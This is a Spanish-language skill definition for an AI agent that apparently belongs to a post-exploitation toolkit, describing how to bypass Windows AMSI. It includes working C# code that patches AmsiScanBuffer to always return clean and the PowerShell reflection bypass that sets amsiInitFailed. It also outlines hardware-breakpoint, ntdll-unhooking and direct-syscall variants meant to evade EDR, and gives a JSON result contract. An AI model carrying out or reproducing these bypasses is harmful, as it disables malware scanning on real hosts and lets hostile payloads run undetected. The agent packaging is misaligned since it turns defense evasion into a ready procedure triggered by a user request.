---
name: evasion-amsi-bypass
description: Bypass de Antimalware Scan Interface (AMSI) en Windows — parcheo de AmsiScanBuffer, hardware breakpoints, reflection, unhooking, memory patching.
phase: post
---

# Evasion — AMSI Bypass

## Activation Contract

**Trigger**: El usuario pide evadir AMSI, ejecutar PowerShell/C# ofuscado, parchear AmsiScanBuffer, o deshabilitar protección AMSI en tiempo real.

**Preconditions**:
- Acceso a un host Windows con PowerShell 5.1+ o .NET Framework 4.8+.
- Capacidad de ejecutar código en memoria (no necesariamente admin).
- Conocimiento del contexto (x86/x64).

**Postconditions**:
- AMSI bypass verificado (AmsiScanBuffer retorna `AMSI_RESULT_CLEAN`).
- Payload ofuscado ejecutado sin trigger AMSI.
- Salida JSON con técnica, estado y verificación.

---

## Hard Rules

1. **El bypass debe ser en memoria**, nunca en disco.
2. **Verificar AMSI está activo** antes de aplicar bypass.
3. **Probar el bypass** con payload de prueba (e.g. `Invoke-Expression "AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386"`).
4. **Restaurar si es posible** después de la prueba.

---

## Decision Gates

| Pregunta | Opciones |
|----------|----------|
| Técnica de bypass | `AmsiScanBuffer patch`, `Hardware breakpoint`, `.NET reflection`, `DLL unhooking`, `Registry patch` |
| Arquitectura | `x64`, `x86`, `both` |
| Contexto | `PowerShell`, `.NET assembly`, `WMI` |
| Confirmar parcheo | `Yes - bypass AMSI`, `No - solo detectar estado` |

---

## Execution Steps

### 1. Detectar estado de AMSI

```powershell
# Verificar si AMSI está activo
[Ref].Assembly.GetTypes() | Where-Object { $_.Name -like "*AMSI*" }

# Probar detección con muestra estándar (debe ser detectado)
$testSample = "AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386"
Invoke-Expression $testSample  # Si AMSI está activo, esto genera alerta
```

### 2. AmsiScanBuffer Patch (método principal)

```csharp
// C#: Ubicar AmsiScanBuffer en amsi.dll y parchear para retornar AMSI_RESULT_CLEAN
// AMSI_RESULT_CLEAN = 0, AMSI_RESULT_DETECTED = 32768

[DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName);
[DllImport("kernel32.dll")] static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

var hMod = GetModuleHandle("amsi.dll");
var fnAddr = GetProcAddress(hMod, "AmsiScanBuffer");
VirtualProtect(fnAddr, 3, 0x40, out var old);
// x64: mov eax, 0; ret (B8 00 00 00 00 C3)
// x86: xor eax, eax; ret (33 C0 C3)
var patch = Environment.Is64BitProcess
    ? new byte[] { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 }
    : new byte[] { 0x33, 0xC0, 0xC3 };
Marshal.Copy(patch, 0, fnAddr, patch.Length);
VirtualProtect(fnAddr, 3, old, out _);
```

### 3. Hardware Breakpoint en AmsiScanBuffer

```csharp
// Usar hardware breakpoints (DR0) para interceptar AmsiScanBuffer
// y forzar retorno AMSI_RESULT_CLEAN sin parchear memoria
// Beneficio: evade scans de integridad de memoria

// 1. SetUnhandledExceptionFilter para capturar EXCEPTION_SINGLE_STEP
// 2. SetThreadContext con DR0 = AmsiScanBuffer, DR7 = 0x1 (activar)
// 3. En el handler, modificar EAX/RAX = 0 y continuar
// Más sigiloso que parcheo directo
```

### 4. .NET Reflection Bypass

```powershell
# Deshabilitar AMSI via reflection sobre los campos internos de System.Management.Automation
# Sin parchear amsi.dll — funciona en memoria administrada

[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') |
    Get-Field -Name 'amsiInitFailed' -Static |
    Set-Value -Static -Value $true

# Alternativa con reflection directa:
$type = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$field = $type.GetField('amsiInitFailed', 'NonPublic,Static')
$field.SetValue($null, $true)
```

### 5. DLL Unhooking (restaurar ntdll desde disco)

```csharp
// AMSI usa ntdll!NtProtectVirtualMemory / NtOpenProcess
// Si hay hooks de EDR en ntdll, restaurar desde una copia limpia en disco
// Útil combinado con AMSI bypass para evadir EDR

// 1. Mapear ntdll.dll desde disco (CreateFileMapping + MapViewOfFile)
// 2. Comparar sección .text entre mapeo en memoria y mapeo limpio
// 3. Escribir las páginas hookeadas con las originales
```

### 6. Memory Patching sin Win32 API

```csharp
// Técnica avanzada: parchear sin VirtualProtect (evita hooks de EDR)
// Usar llamadas directas a ntdll o syscalls nativas

[DllImport("ntdll.dll")] static extern int NtProtectVirtualMemory(
    IntPtr ProcessHandle, ref IntPtr BaseAddress,
    ref uint NumberOfBytesToProtect, uint NewAccessProtection,
    out uint OldAccessProtection);
// Llamada directa a ntdll evita hooks en kernel32
```

### 7. Probar bypass

```powershell
# Después de aplicar bypass, probar con payload ofuscado
# El bypass exitoso permite ejecutar sin alerta
$testPayload = @"
using System.Runtime.InteropServices;
using System;
public class Test {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(...);
}
"@
Add-Type $testPayload
```

---

## Output Contract

```json
{
  "phase": "post",
  "skill": "evasion-amsi-bypass",
  "target": {
    "host": "WIN-XXXX",
    "amsi_version": "5.1.22621.1",
    "process": "powershell.exe"
  },
  "technique": "AmsiScanBuffer_Patch_x64",
  "result": {
    "success": true,
    "amsi_initial_state": "active",
    "amsi_post_state": "bypassed",
    "patched_address": "0x7ffb12345678",
    "original_bytes": "0x48895C2408",
    "patched_bytes": "0xB800000000C3"
  },
  "verification": {
    "test_sample": "AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386",
    "detected_before": true,
    "detected_after": false
  },
  "cleanup": "Restaurar bytes originales en amsi.dll"
}
```

## Referencias

- MITRE ATT&CK T1562.001 (Impair Defenses: AMSI)
- `amsi.dll` — `AmsiScanBuffer`, `AmsiScanString`
- System.Management.Automation.AmsiUtils
- Hardware breakpoints via `SetThreadContext`
